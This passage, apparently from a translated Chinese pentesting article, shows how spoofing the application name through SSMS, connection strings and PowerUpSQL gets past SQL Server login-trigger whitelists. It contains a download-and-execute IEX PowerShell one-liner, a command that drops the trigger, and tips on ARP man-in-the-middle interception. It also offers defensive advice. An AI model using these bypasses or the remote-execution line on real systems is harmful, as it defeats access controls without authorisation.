     (
     ------ Set the white list of application names here
     APP_NAME() NOT IN ('Application1','Application2','SuperApp3000','LegacyApp','DevApp1')
     )
     BEGIN
     RAISERROR('You cannot connect to SQL Server from this machine', 16, 1);
     ROLLBACK;
     END
     END
[](https://p3.ssl.qhimg.com/t013b1bfa067c773938.png)
  4. 设置登录触发器后，当再次尝试使用SSMS登录时，应该会收到如下所示的错误，因为你正在从一个不在列表中的应用程序进行连接。  
[](https://p2.ssl.qhimg.com/t012f5b56cc938c5043.png)
再一次，你可能会问，“我什么时候才能真正实际使用它？”一些应用程序把名称静态设置在用于连接到SQL
Server的连接字符串中。实际上，很少看到登录触发器按应用程序名称限制访问，但我们已经见过几次了。
## 使用SSMS欺骗应用程序名称
  1. 在SSMS中打开“Connect Object Explorer”并选择options -> “Additional Connection Parameters”。在这里你可以动态地设置连接字符串属性。我们把“application name/应用程序名称”属性设置为“SuperApp3000”，这是一个白名单中的应用程序名称。  
[](https://p1.ssl.qhimg.com/t01eb9892fe616b4e8f.png)
  2. 登录。如果你打开一个查询窗口并再次检查您的应用程序名称，它应该返回“SuperApp3000”。这说明我们成功地欺骗了主机名。 
         SELECT APP_NAME()
[](https://p4.ssl.qhimg.com/t0172e94fbd167d688a.png)
## 使用连接字符串欺骗应用程序名称
正如我在上一节中提到的，应用程序可以使用名为“AppName”的连接字符串属性向SQL Server声明其应用程序名称。下面是示例。
    Data Source=serverinstance1;Initial Catalog=Master;Integrated Security=True;  Application Name =MyApp"
    Data Source=serverinstance1;Initial Catalog=Master;Integrated Security=True;  ApplicationName =MyApp"
    Data Source=serverinstance1;Initial Catalog=Master;Integrated Security=True;  AppName =MyApp"
## 使用PowerUpSQL欺骗应用程序名称
为了演示，我已经更新了PowerUpSQL的Get-SQLQuery函数，包含了“appname”选项。下面是一个基本的例子。
  1. 打开Powershell并通过你喜欢的方法加载PowerUpSQL。下面的示例演示如何直接从GitHub加载。 
        IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1")
  2. PowerUpSQL函数封装.NET SQL Server函数。使用.NET连接到SQLServer时，“appname”属性默认设置为“..Net SqlClient Data Provider”。但是，由于我们创建了一个新的登录触发器，它通过“appname”来限制访问，我们应该会得到以下错误。 
         Get-SQLQuery -Verbose -Instance MSSQLSRV04SQLSERVER2014 -Query "SELECT app_name()" -ReturnError
[](https://p4.ssl.qhimg.com/t01606f099a444d2689.png)
  3. 现在将“appname”属性设置为“SuperApp3000”，应该能够成功执行查询。 
         Get-SQLQuery -Verbose -Instance MSSQLSRV04SQLSERVER2014 -Query "SELECT app_name()" -AppName SuperApp3000
[](https://p1.ssl.qhimg.com/t01f06b145dd831af08.png)
  4. 要删除触发器，可以使用下面的命令。 
        Get-SQLQuery -Verbose -Instance MSSQLSRV04SQLSERVER2014 -AppName SuperApp3000 -Query 'DROP TRIGGER MyAppsOnly on all server'
  5. 现在可以连接了，不需要欺骗应用程序名称。 
         Get-SQLQuery -Verbose -Instance MSSQLSRV04SQLSERVER2014  -Query 'SELECT APP_NAME()'
[](https://p3.ssl.qhimg.com/t0173df813727f35db7.png)
  6. 或者，也可以用任何应用程序名称。 
         Get-SQLQuery -Verbose -Instance MSSQLSRV04SQLSERVER2014 -AppName EvilClient -Query 'SELECT APP_NAME()'
[](https://p1.ssl.qhimg.com/t01c781cd8f1bb78544.png)
## 查找白名单主机名和应用程序名称
如果不确定登录触发器的白名单中有哪些主机名和应用程序，下面是一些发现这些主机名和应用程序的选项。
###  1\. 检查登录触发器源代码
要获得登录触发器列出的主机名和应用程序的完整列表，最好的方法是检查源代码。然而，在大多数情况下，这需要访问权限。
    SELECT    name,
    OBJECT_DEFINITION(OBJECT_ID) as trigger_definition,
    parent_class_desc,
    create_date,
    modify_date,
    is_ms_shipped,
    is_disabled
    FROM sys.server_triggers  
    ORDER BY name ASC
[](https://p4.ssl.qhimg.com/t01133c7adaf3d7f8b7.png)
###  2\. 检查硬编码值的应用程序代码
有时候所允许的主机名和应用程序被硬编码到应用程序中。如果你正在处理.NET或Java应用程序，则可以对源代码进行反编译并检查与它们正在使用的连接字符串相关的关键字。这个方法假定你可以访问应用程序集或配置文件。[JD-GUI](http://jd.benow.ca/)和[DNSPY](https://github.com/0xd4d/dnSpy)可以派上用场。
###  3\. 检测应用流量
有时候，当应用程序启动时，从数据库服务器获取所允许的主机名和应用程序。因此，你可以使用嗅探器来获取列表。我经历过几次。
###  4\. 使用域名系统列表
如果你已经有域名账户，则可以查询Active
Directory以获得域名列表。然后循环访问该列表，直到遇到一个允许连接的列表。这假定当前域用户具有登录到SQL
Server的权限，并且白名单上的主机名与该域相关联。
###  5\. 使用MITM来存储连接
你还可以执行基于ARP的标准中间人(MITM)攻击，以拦截远程系统到SQL
Server的连接。如果连接已加密，将看不到通信内容，但能够看到哪些主机正在连接。当然，也可以使用MITM技术。
注意：如果正在进行证书验证，可能会导致数据包丢失并对生产系统产生影响，因此请谨慎使用该方法。
## 一般性建议
  * 不要根据客户端容易更改的信息使用登录触发器来限制对SQL Server的访问。
  * 如果希望限制对允许的系统列表的访问，请考虑使用网络或主机级防火墙规则，而不是登录触发器。
  * 考虑根据用户组和分配的权限限制对SQL Server的访问，而不是使用登录触发器。
## 结束
本文我介绍了几种利用连接字符串属性来绕过由SQL
Server登录触发器强制执行的访问限制的方法。如果你必须对旧桌面应用程序执行渗透测试，希望这将是有用的。对于那些感兴趣的人，我还在这里更新了“[SQL
Server连接字符串CheatSheet](https://gist.github.com/nullbind/91c573b0e27682733f97d4e6eebe36f8)”。
## 引用
  * 
  * 
  * 
审核人：yiwang 编辑：边边